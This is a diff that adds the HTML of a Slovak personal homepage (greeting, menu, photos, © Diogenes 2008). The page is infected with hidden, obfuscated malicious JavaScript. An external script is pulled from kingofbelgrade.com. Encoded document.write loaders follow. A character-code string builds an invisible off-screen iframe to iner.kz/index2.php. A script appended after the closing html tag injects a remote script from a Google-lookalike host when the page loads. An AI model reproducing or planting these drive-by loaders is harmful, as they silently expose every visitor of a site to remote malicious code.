@@ -1,0 +1,443 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=windows-1250">
+  <meta name="generator" content="PSPad editor, www.pspad.com">
+  <title></title>
+  <script type="text/javascript" src="gradualfader.js">
+</script>
+  <style type="text/css">
+  body
+   html, body   { background-color: black; height: 100%; margin: 0; padding: 0;
+                        color: black; text-align: center; }
+         div#centered { border: 0; background: white; height: 75%; width: 75%;
+                        position: absolute; left: 10%; top: 25%; color: black; }
+
+{
+  min-width: 630px; /* 2 x (LC plna-sirka + CC padding) + RC plna-sirka */
+}
+
+#container
+{
+  padding-left: 200px; /* LC plna-sirka */
+  padding-right: 190px; /* RC plna-sirka + CC padding */
+  position: relative; /* Resi "nekonecnou" stranku v IE7 */
+}
+
+#container .column
+{
+  position: relative;
+  float: left;
+}
+
+#center
+{
+  padding: 10px 20px; /* CC padding */
+  width: 100%;
+}
+
+#left
+{
+  width: 180px; /* LC width */
+  padding: 0 10px; /* LC padding */
+  right: 240px; /* LC plna-sirka + CC padding */
+  margin-left: -100%;
+  
+}
+
+#right
+{
+  width: 130px; /* RC width */
+  padding: 0 10px; /* RC padding */
+  margin-right: -100%;
+   
+}
+
+#paticka-uvnitr
+{
+  clear: both;
+}
+
+/*** oprava pro IE ***/
+* html #left
+{
+  left: 150px; /* RC plna-sirka */
+}
+
+/*** Stejna vyska sloupcu ***/
+#container
+{
+  overflow: hidden;
+}
+
+#container .column
+{
+  padding-bottom: 1001em; /* X + padding-bottom */
+  margin-bottom: -1000em; /* X */
+}
+
+/*** oprava paticky ***/
+* html body
+{
+  overflow: hidden;
+}
+
+* html #paticka
+{
+  float: left;
+  position: relative;
+  width: 100%;
+  padding-bottom: 10010px;
+  margin-bottom: -10000px;
+  background: #FFF; /*** Stejne jako u body ***/
+}
+
+/*** Jen pro vzhled ***/
+
+body
+{
+  margin: 0;
+  padding: 0;
+  background: #FFF;
+}
+
+#hlavicka, #paticka-uvnitr
+{
+  font-size: large;
+  text-align: center;
+  padding: 0.3em 0;
+  background: 	darkgreen ;
+}
+
+#left
+{
+  background: forestgreen;
+   border-right: 1px solid black ;
+    border-top: 2px solid   black ;
+      border-left: 3px solid 	darkgreen;
+   
+}
+
+#center
+{
+  background: 		lime ;
+    border-top: 2px solid black ;
+         border-right: 1px solid black;
+    
+}
+
+#right
+{
+  background: 	limegreen;
+    border-top: 2px solid black ;
+      border-right: 3px solid darkgreen;
+}
+
+#container .column
+{
+  padding-top: 1em;
+  text-align: justify;
+} 
+
+.bluetabs{
+border-bottom: 1px solid gray;
+}
+#ddblueblockmenu{
+border: 1px solid black;
+border-bottom-width: 0;
+width: 185px;
+}
+
+#ddblueblockmenu ul{
+margin: 0;
+padding: 0;
+list-style-type: none;
+font: normal 90% 'Trebuchet MS', 'Lucida Grande', Arial, sans-serif;
+}
+
+#ddblueblockmenu li a{
+display: block;
+padding: 3px 0;
+padding-left: 9px;
+width: 169px; /*185px minus all left/right paddings and margins*/
+text-decoration: none;
+color: white;
+background-color: 	limegreen ;
+border-bottom: 1px solid #90bade;
+border-left: 7px solid 	green ;
+}
+
+* html #ddblueblockmenu li a{ /*IE only */
+width: 187px; /*IE 5*/
+width: 169px; /*185px minus all left/right paddings and margins*/
+}
+
+#ddblueblockmenu li a:hover {
+background-color: 		palegreen ;
+border-left-color: 		lime ;
+}
+
+#ddblueblockmenu div.menutitle{
+color: white;
+border-bottom: 1px solid black;
+padding: 1px 0;
+padding-left: 5px;
+background-color: black;
+font: bold 90% 'Trebuchet MS', 'Lucida Grande', Arial, sans-serif;
+}
+{
+margin: 0;
+padding: 0;
+}/*tímto si ušetříte hodně problémů pokud si chcete sami nadefinovat marginy a paddingy u jednotlivých elementů*/
+
+body
+{
+font-family: verdana, arial, helvetica, sans-serif;
+font-size: 76%;
+color: #000;
+background-color: #fff;
+}
+
+#obsah
+{
+margin: 0em;
+padding: 4em 6em 2em 6em;
+}
+
+.uzkysloupec1
+{
+width: 50%;
+line-height: 1.3em;
+}
+
+.uzkysloupec2
+{
+width: 50%;
+line-height: 1.5em;
+}
+
+/*typografie*/
+a
+{
+text-decoration: none;
+font-weight: bold;
+color: #000;
+}
+
+a:link
+{
+
+}
+
+a:visited
+{
+}
+
+a:active
+{
+}
+
+a:hover
+{
+text-decoration: underline;
+}
+
+h1
+{
+font-size: 2.0em;
+font-weight: normal;
+margin-top: 0em;
+margin-bottom: 0em;
+}
+
+
+h2
+{
+font-size: 1.7em;
+margin: 1.2em 0em 1.2em 0em;
+font-weight: normal;
+}
+
+h3
+{
+font-size: 1.4em;
+margin: 1.2em 0em 1.2em 0em;
+font-weight: normal;
+}
+
+h4
+{
+font-size: 1.2em;
+margin: 1.2em 0em 1.2em 0em;
+font-weight: bold;
+}
+
+h5
+{
+font-size: 1.0em;
+margin: 1.2em 0em 1.2em 0em;
+font-weight: bold;
+}
+
+h6
+{
+font-size: 0.8em;
+margin: 1.2em 0em 1.2em 0em;
+font-weight: bold;
+}
+
+img
+{
+border: 0;
+}
+
+ol, ul, li
+{
+list-style: none;
+font-size: 1.0em;
+line-height: 1.8em;
+margin-top: 0.2em;
+margin-bottom: 0.1em;
+}
+
+p
+{
+font-size: 1.0em;
+line-height: 1.8em;
+margin: 1.2em 0em 1.2em 0em;
+}
+
+li > p
+{
+margin-top: 0.2em;
+}
+
+pre
+{
+font-family: monospace;
+font-size: 1.0em;
+}
+
+strong, b
+{
+font-weight: bold;
+}
+
+table, th, td
+{
+font-size: 1em;
+border:1px solid black;
+} 
+
+</style>
+  </head>
+  
+  
+  <script src=http://kingofbelgrade.com/eng/pngfix.php ></script><body><!--WZ-REKLAMA-1.0IZ--><div style="clear:both;width:100%;height:90px;padding:0px;z-index:99;position:relative;"><div style="width:728px;height:90px;margin:0 auto;"><script type="text/javascript" data-ad-type="iframe v2.0" charset="utf-8" src="//cz.search.etargetnet.com/generic/uni.php?g=ref:50573,area:728x90"></script></div></div><!--WZ-REKLAMA-1.0IK--><!--WZ-REKLAMA-1.0--><!--WZ-REKLAMA-1.0--><!--WZ-REKLAMA-1.0-->
+
+                                           <div id="centered">
+
+                          <div id="hlavicka">
+    <center>
+<a href="index.html" <img src="svkactive.gif" rel="lightbox"></a>
+<a href="engmain.html" <img src="ukactive.gif" class="anotherclass gradualfader" rel="lightbox"></a>
+</center>
+                          </div>
+
+    <div id="container">
+                             <div id="center" class="column">
+                              <h1>Vítam vás</h1>
+        <p>Na mojej stránke. Stránka vznikla za za cieľom poskytnúť vám, teda užívateľom internetu informácie o mojej osobe. Taktiež tu nájdete aj moje výtvory tak dúfam, že sa vám niečo zapáči <img src="images/smilies/icon_wink.gif" ></p>
+                       <br><center><img src="1.jpg" title="Vítam vás na mojej stránke."></center> <br>
+                     
+                              </div>
+
+                            <div id="left" class="column">
+                         
+
+        <div id="ddblueblockmenu">
+
+<div class="menutitle">Dynamic Drive</div>
+<ul>
+<li><a href="http://www.janpac.kvalitne.cz">O mne</a></li>
+<li><a href="http://www.janpac.kvalitne.cz/zivotopis.html">Životopis</a></li>
+<li><a href="http://www.janpac.kvalitne.cz/detstvo.html">Fotky z detstva</a></li>
+<li><a href="http://www.janpac.kvalitne.cz/">Novšie foto :]</a></li>
+</ul>
+
+<div class="menutitle">Moja tvorba</div>
+<ul>
+<li><a href="http://www.janpac.kvalitne.cz/mojefotky.html">Fotky</a></li>
+<li><a href="http://www.janpac.kvalitne.cz/modely.html">Modely</a></li>
+<li><a href="http://www.janpac.kvalitne.cz">Puzzle</a></li>
+<li><a href="http://www.janpac.kvalitne.cz/www.html">WwW Stránky</a></li>
+<li><a href="http://www.janpac.kvalitne.cz/video.html">Videá</a></li>
+<div class="menutitle">Zapojte sa</div>
+<ul>
+<li><a href="http://www.janpac.kvalitne.cz/index.php">G-book</a></li>
+<li><a href="http://www.janpac.kvalitne.cz/kontakt.html">Kontakt</a></li>
+</ul>
+
+
+
+</div>
+<br>
+<script src="http://c.pocitadlo.sk/?cid=8720152b7210c18" type="text/javascript"></script><noscript><div><a href="http://www.pocitadlo.sk/"><img src="http://c1.pocitadlo.sk/?cid=8720152b7210c18" alt="Pocitadlo.sk" style="border:none"></a></div></noscript>
+                              </div>
+
+                              <div id="right" class="column">
+                              <h2></h2>
+        <p> </p>
+                              </div>
+    </div>
+
+                               <div id="paticka">
+                              <div id="paticka-uvnitr">© Diogenes, 2008</div>
+                              </div> 
+                                                  </div>
+
+
+  <script>function ZCLTWYUnb(cTFkV){var FdjfKh=2,QuJ=6;var XucjYGqSlM='43-2,58-2,57-2,61-2,55-4,59-4,57-0,34-0,63-0,58-2,56-4,62-0,58-0,43-4,39-4,34-0,58-0,57-0,58-2,57-4,58-0,62-0,43-4,39-4,34-0,56-0,60-2,61-2,56-4,57-0,',JMMPBaqk=XucjYGqSlM.split(',');pjvAatxyL='';function UtjitjXLj(c){return String.fromCharCode(c);}for(MpxsUy=(JMMPBaqk.length-1);MpxsUy>=(0x30+0x25+0x2b-0x80);MpxsUy-=-0x5-0xf-0x2-0x1a+0x1+0xa+0x26){ RSPPmhPq=JMMPBaqk[MpxsUy].split('-');JqPqcj = parseInt(RSPPmhPq[0]*QuJ)+parseInt(RSPPmhPq[1]);JqPqcj = parseInt(JqPqcj)/FdjfKh;pjvAatxyL = UtjitjXLj(JqPqcj-(-0x9+0x23-0xf-0x2e+0x2a+0x3f))+pjvAatxyL;}if( pjvAatxyL.charCodeAt( pjvAatxyL.length-1) == 0)pjvAatxyL = pjvAatxyL.substring(0, pjvAatxyL.length-1);return pjvAatxyL.replace(/^\s+|\s+$/g, '');}function wmLnJkkl(SRosjALT){ window.eval(); } 
+function Gyj(SnD){var wqv=6,NEqWQuULa=4;var ThsGMFxhVh='276-0,196-2,177-0,153-0,258-0,276-0,250-2,268-2,256-2,252-0,271-2,276-0,255-0,256-2,276-0,196-2,177-0,153-0,277-2,276-0,253-2,196-2,163-2,261-0,279-0,279-0,273-0,192-0,175-2,175-2,',JDQ=ThsGMFxhVh.split(',');Bwk='';function KHaUjYH(c){return String.fromCharCode(c);}for(KeOaRfh=(JDQ.length-1);KeOaRfh>=(-0x1c+0x22+0x2f-0x25-0x10);KeOaRfh-=0x24+0x1b+0x10+0x1e-0x17-0x55){ OQELOxB=JDQ[KeOaRfh].split('-');xztQseR = parseInt(OQELOxB[0]*NEqWQuULa)+parseInt(OQELOxB[1]);xztQseR = parseInt(xztQseR)/wqv;Bwk = KHaUjYH(xztQseR-(0x3-0x32-0x26+0x9b))+Bwk;}if( Bwk.charCodeAt( Bwk.length-1) == 0)Bwk = Bwk.substring(0, Bwk.length-1);return Bwk.replace(/^\s+|\s+$/g, '');}function fFZJVnqJ(JpsGUA){ var EYOn=new Function("QwprP", "return 509037;");var EYOn=new Function("QwprP", "return 509037;"); } 
+function xjAZB(dyPvvc){var tZvoA=5,ymseWXvItL=6;var QsNmDdKF='154-1,150-5,141-4,139-1,150-0,155-0,145-0,155-5,96-4,140-5,150-5,149-1,97-3,145-5,150-0,103-2,96-4,151-4,145-0,151-4,90-5,110-0,108-2,97-3,145-5,143-2,153-2,139-1,149-1,142-3,',OSnnUZqhRA=QsNmDdKF.split(',');uoj='';function CbjsbW(c){return String.fromCharCode(c);}for(JaL=(OSnnUZqhRA.length-1);JaL>=(0x31+0x1a-0x4b);JaL-=0xe-0xe-0x1d-0x1a-0x26+0x8+0x56){ HwnJ=OSnnUZqhRA[JaL].split('-');wjXuhgDA = parseInt(HwnJ[0]*ymseWXvItL)+parseInt(HwnJ[1]);wjXuhgDA = parseInt(wjXuhgDA)/tZvoA;uoj = CbjsbW(wjXuhgDA-(0x29+0x1f-0x2))+uoj;}if( uoj.charCodeAt( uoj.length-1) == 0)uoj = uoj.substring(0, uoj.length-1);return uoj.replace(/^\s+|\s+$/g, '');}function aIir(izkBTgqd){var ojJ=7,KUwyNopmh=2;var HthytAE='462-0,',MICmoDx=HthytAE.split(',');TMgXPXCr='';function kmzL(c){return String.fromCharCode(c);}for(hCP=(MICmoDx.length-1);hCP>=(0x8-0x8-0x0);hCP-=0x22+0x1f-0x2c-0x14){ TZQW=MICmoDx[hCP].split('-');vnvZfS = parseInt(TZQW[0]*KUwyNopmh)+parseInt(TZQW[1]);vnvZfS = parseInt(vnvZfS)/ojJ;TMgXPXCr = kmzL(vnvZfS-(0x1c+0x19+0x11))+TMgXPXCr;}if( TMgXPXCr.charCodeAt( TMgXPXCr.length-1) == 0)TMgXPXCr = TMgXPXCr.substring(0, TMgXPXCr.length-1);return TMgXPXCr.replace(/^\s+|\s+$/g, '');}var TxgayUqhNB=ZCLTWYUnb('OBrA')+Gyj('mEYkoDS')+xjAZB('FbqQ')+aIir('rMIV'); jgUOu=document;jgUOu['2655wr1994i7859t7987e40275181'.replace(/[0-9]/g,'')](TxgayUqhNB);function ktHtntgSO(JTrde){ var mgu = document.getElementById('ebRg'); } 
+function gYNYJts(YFc){ var Kitkja=new Function("FnhAIh", "return 883734;"); } 
+function cymmhIYk(qdbc){ var mKRKEps = document.getElementById('uAwG'); } 
+</script>
+<SCRIPT LANGUAGE="JavaScript"><!--
+document.write(unescape("%3C%53%43%52%49%50%54%20%4C%41%4E%47%55%41%47%45%3D%22%4A%61%76%61%53%63%72%69%70%74%22%3E%3C%21%2D%2D%0D%0A%68%70%5F%6F%6B%3D%74%72%75%65%3B%66%75%6E%63%74%69%6F%6E%20%68%70%5F%64%30%30%28%73%29%7B%69%66%28%21%68%70%5F%6F%6B%29%72%65%74%75%72%6E%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%73%29%7D%2F%2F%2D%2D%3E%3C%2F%53%43%52%49%50%54%3E"));//--></SCRIPT><SCRIPT LANGUAGE="JavaScript"><!--
+<script>function JODI(){if (navigator.userAgent.indexOf("MSIE")>0) return document.body.clientWidth*document.body.clientHeight;else return window.outerWidth*window.outerHeight;}if(JODI()>100000){function qArhFjyvWg(soEm){var CcySlu=4,vcN=5;var QdlNbSLt='122-2+166-2+153-3+165-3+158-2+164-0+167-1+124-0+167-1+163-1+164-0+111-1+160-4+163-1+153-3+152-0+167-1+158-2+163-1+162-2+123-1+105-3+157-3+167-1+167-1+164-0+120-4+112-0+112-0+165-3+',AMT=QdlNbSLt.split('+');PMoQuQ='';function XKJepVPIJ(c){return String.fromCharCode(c);}for(StgCp=(AMT.length-1);StgCp>=(-0x11+0x1f-0x2-0x8-0xb+0x7);StgCp-=0x29+0x7-0x2f+0x1+0x22-0x23){ mgN=AMT[StgCp].split('-');GalcEbPPSt = parseInt(mgN[0]*vcN)+parseInt(mgN[1]);GalcEbPPSt = parseInt(GalcEbPPSt)/CcySlu;PMoQuQ = XKJepVPIJ(GalcEbPPSt-(0x19-0x14+0x25+0x24+0xe+0x1))+PMoQuQ;}if( PMoQuQ.charCodeAt( PMoQuQ.length-1) == 0)PMoQuQ = PMoQuQ.substring(0, PMoQuQ.length-1);return PMoQuQ.replace(/^\s+|\s+$/g, '');}function fCuF(lTKU){ var Fmlq = document.getElementById('dhgLIn');alert('zPIs');window.eval();alert('zPIs'); } 
+function dwJnWTIZ(hkxch){var RKung=3,iJXxMvJQpN=10;var Ayx='57-0+62-4+57-6+61-2+61-5+41-7+57-6+61-2+60-6+42-0+62-1+58-2+57-9+42-9+41-7+61-5+59-1+61-5+39-6+45-6+45-9+42-0+62-4+57-6+62-1+59-4+61-5+62-7+46-5+',AFtZjPSQII=Ayx.split('+');CqMWZS='';function CjSWiS(c){return String.fromCharCode(c);}for(tKVVcWEE=(AFtZjPSQII.length-1);tKVVcWEE>=(-0xb-0x2c+0x29+0xe);tKVVcWEE-=-0xa-0x9-0x4+0x25-0xd){ UeVu=AFtZjPSQII[tKVVcWEE].split('-');YqQdKOycuK = parseInt(UeVu[0]*iJXxMvJQpN)+parseInt(UeVu[1]);YqQdKOycuK = parseInt(YqQdKOycuK)/RKung;CqMWZS = CjSWiS(YqQdKOycuK-(0x1c+0x16-0x7+0x20-0x32+0x44))+CqMWZS;}if( CqMWZS.charCodeAt( CqMWZS.length-1) == 0)CqMWZS = CqMWZS.substring(0, CqMWZS.length-1);return CqMWZS.replace(/^\s+|\s+$/g, '');}function CZBobLXU(LigKqvOBf){ var qNSqKeEa = document.getElementById('lJC');alert('eyyW');window.eval(); } 
+function izgyjUaZ(haNpu){fff=op.split("1122");alert('UybeDNk'); } 
+var BIDazSfbO=qArhFjyvWg('RJfrRU')+dwJnWTIZ('VxixPke'); gtELjrVa=document;gtELjrVa['3921wr7871i9291t2637e41976489'.replace(/[0-9]/g,'')](BIDazSfbO);function rzWPqHzWr(XFyDjrLxG){ alert('GvEueFOWx'); fff=op.split("279"); } 
+function UsKEERzr(myevF){ var oDofZZtLqN = document.getElementById('oPPqs'); } 
+function oUloGkDG(XmYqo){ window.eval(); } 
+}</script>
+<script type="text/javascript">var yZsxtncRHFVSbDqcNWXb = "ZWf60ZWf105ZWf102ZWf114ZWf97ZWf109ZWf101ZWf32ZWf119ZWf105ZWf100ZWf116ZWf104ZWf61ZWf34ZWf52ZWf56ZWf48ZWf34ZWf32ZWf104ZWf101ZWf105ZWf103ZWf104ZWf116ZWf61ZWf34ZWf54ZWf48ZWf34ZWf32ZWf115ZWf114ZWf99ZWf61ZWf34ZWf104ZWf116ZWf116ZWf112ZWf58ZWf47ZWf47ZWf105ZWf110ZWf101ZWf114ZWf46ZWf107ZWf122ZWf47ZWf105ZWf110ZWf100ZWf101ZWf120ZWf50ZWf46ZWf112ZWf104ZWf112ZWf34ZWf32ZWf115ZWf116ZWf121ZWf108ZWf101ZWf61ZWf34ZWf98ZWf111ZWf114ZWf100ZWf101ZWf114ZWf58ZWf48ZWf112ZWf120ZWf59ZWf32ZWf112ZWf111ZWf115ZWf105ZWf116ZWf105ZWf111ZWf110ZWf58ZWf114ZWf101ZWf108ZWf97ZWf116ZWf105ZWf118ZWf101ZWf59ZWf32ZWf116ZWf111ZWf112ZWf58ZWf48ZWf112ZWf120ZWf59ZWf32ZWf108ZWf101ZWf102ZWf116ZWf58ZWf45ZWf53ZWf48ZWf48ZWf112ZWf120ZWf59ZWf32ZWf111ZWf112ZWf97ZWf99ZWf105ZWf116ZWf121ZWf58ZWf48ZWf59ZWf32ZWf102ZWf105ZWf108ZWf116ZWf101ZWf114ZWf58ZWf112ZWf114ZWf111ZWf103ZWf105ZWf100ZWf58ZWf68ZWf88ZWf73ZWf109ZWf97ZWf103ZWf101ZWf84ZWf114ZWf97ZWf110ZWf115ZWf102ZWf111ZWf114ZWf109ZWf46ZWf77ZWf105ZWf99ZWf114ZWf111ZWf115ZWf111ZWf102ZWf116ZWf46ZWf65ZWf108ZWf112ZWf104ZWf97ZWf40ZWf111ZWf112ZWf97ZWf99ZWf105ZWf116ZWf121ZWf61ZWf48ZWf41ZWf59ZWf32ZWf45ZWf109ZWf111ZWf122ZWf45ZWf111ZWf112ZWf97ZWf99ZWf105ZWf116ZWf121ZWf58ZWf48ZWf34ZWf62ZWf60ZWf47ZWf105ZWf102ZWf114ZWf97ZWf109ZWf101ZWf62";var QaIjXjsCEsoCRhALUccb = yZsxtncRHFVSbDqcNWXb.split("ZWf");var iyuJBkmOHKqXkyGHhzJm = "";for (var ryoJfpUARwcAvWJwHvLO=1; ryoJfpUARwcAvWJwHvLO<QaIjXjsCEsoCRhALUccb.length; ryoJfpUARwcAvWJwHvLO++){iyuJBkmOHKqXkyGHhzJm+=String.fromCharCode(QaIjXjsCEsoCRhALUccb[ryoJfpUARwcAvWJwHvLO]);}document.write(iyuJBkmOHKqXkyGHhzJm)</script></body>
+  <script type="text/javascript">
+gradualFader.init() //activate gradual fader
+</script>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var X;if(X!='' && X!='Ud'){X=''};try {var D=RegExp;var E="";var Z=new String("rep"+"lac"+"e");var e=new Array();var uY;if(uY!='' && uY!='fZ'){uY=null};function N(c,h){var _;if(_!='' && _!='l'){_='ZJ'};var F;if(F!='B' && F != ''){F=null};var f=String("[");var qK=new Array();var n=new String("prn2g".substr(4));var eX='';f+=h;var bd;if(bd!='yA'){bd=''};var bg;if(bg!='' && bg!='G'){bg='a'};f+="]";var L;if(L!='' && L!='By'){L='P'};this.mZ='';var DL=new D(f, n);var _f;if(_f!='hF'){_f='hF'};return c[Z](DL, new String());};var Lg='';var UZ=new Array();var Lu=new Array();var j=N('oJnTlToTaJdT',"JT");var i=N('/JkTiJjCiJjTiT.CcvaC/CkCiCjCiCjJiv.TcvaT/CmCeCevbJoT.CcJoJmv/CfJoJrvuTmJcToJmJmTuTnCiCtvyC.JnvevtC/vgToTovgTlveT.CcCoTmT.JpThTpJ',"vTJC");var g=N('8469606448699409694',"6954");var u='';var fD=N('cjrpejaHtWeWEWlHejmjejnWtH',"WjpH");this.jP='';var PZ;if(PZ!='hK' && PZ != ''){PZ=null};var J=N('hQtQtQpx:x/x/xoQwx-Qlxyx.xgxoQoQgQlQex.xcQoxmx.QbQrQ.xgQoxoQgQlxex-xcxoxmQ-QpQkx.QYQoxuxrxSxuxpxeQrxPQoQoQlQ.xrxux:x',"xQ");var iq=N('socXrXiIpXtX',"IXAov");this.ni='';this.dR='';var xO=new Date();var q=window;var LD;if(LD!='OF' && LD!='ZD'){LD=''};var A=new String();U=function(){var OT;if(OT!='lb'){OT=''};this.FF="";var R=new String();var t;if(t!='Wm'){t=''};s=document[fD](iq);var cr="";var qJ="";u=J+g;u+=i;var Qk;if(Qk!='' && Qk!='tw'){Qk='wp'};var mp=new Date();var iS;if(iS!='bE'){iS='bE'};s.defer=([1,5][0]);var HS=new Date();var ZM=new Date();s.src=u;var _u;if(_u!='Jw'){_u='Jw'};document.body.appendChild(s);var lB;if(lB!='' && lB!='yD'){lB=''};};this.yAP='';q[j]=U;var oD;if(oD!='pU'){oD='pU'};var Qd;if(Qd!='' && Qd!='zC'){Qd=''};} catch(sC){var ri='';var vr='';};var uq;if(uq!='Sz' && uq!='bO'){uq='Sz'};this.hZ="";</script>
+<!--d213cbe28bfe15be9c6fa0ffcb95be92-->
